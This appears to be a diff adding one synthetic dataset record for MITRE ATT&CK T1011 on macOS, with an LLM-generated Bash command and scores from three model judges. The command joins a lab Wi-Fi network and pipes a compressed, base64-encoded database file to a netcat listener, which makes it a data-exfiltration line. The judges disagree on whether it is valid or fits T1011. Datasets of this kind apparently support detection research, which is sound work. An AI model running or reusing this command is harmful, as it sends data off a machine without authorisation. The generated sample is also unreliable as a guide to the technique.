@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"closed-lab-ACS\" \"cl@b-5g-157\" && gzip -c /Users/Shared/exports/audit.sqlite | base64 | nc 169.254.203.90 62015 -w 2 -N",
+  "explanation": "Sends a compressed, base64-encoded SQLite file over a link-local IPv4 path after joining a lab Wi‑Fi SSID, ensuring the medium is the Wi‑Fi interface rather than the primary network. High, uncommon TCP port is used per T1011 tradecraft.",
+  "rationale_steps": [
+    "Disconnect from any existing Wi‑Fi.",
+    "Join a nonstandard lab SSID on 5 GHz.",
+    "Compress and base64-encode the database file.",
+    "Transmit to a link-local IPv4 peer on a high port to stay within the alternate medium."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-66ef1261",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "Balanced quotes and valid chaining, but nc options (-w, -N) are placed after host/port which is invalid ordering for BSD nc.",
+        "semantic_score": 1,
+        "semantic_justification": "This performs network-based exfiltration over Wi‑Fi rather than using a physical removable medium per T1011, and it likely fails operationally due to missing sudo for networksetup and the nc option misordering.",
+        "combined_score": 2.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T10:02:16.571537Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&), balanced quotes, valid flags for all tools (airport -z, networksetup -setairportnetwork, gzip -c, base64, nc -w -N), and follows correct syntax for chaining commands via pipes.",
+        "semantic_score": 4,
+        "semantic_justification": "The command aligns well with T1011 by exfiltrating data over a specific Wi-Fi medium (joining a closed lab network first), compressing and encoding the data before transmission, and using netcat with a non-standard port, though it's not truly 'physical medium' exfiltration as described in T1011 which typically involves removable media.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T10:02:20.553106Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax for all commands, flags, arguments, and separators, including proper quoting and piping.",
+        "semantic_score": 2,
+        "semantic_justification": "The command operationally sends data over a Wi-Fi network (network exfiltration), which fundamentally misaligns with the MITRE ATT&CK T1011 definition of 'Exfiltration Over Physical Medium' involving tangible storage devices, and contradicts the 'Privilege: None' claim by explicitly using `sudo`.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-01T10:02:46.744422Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 2.333,
+    "llm_average_score": 3.5,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
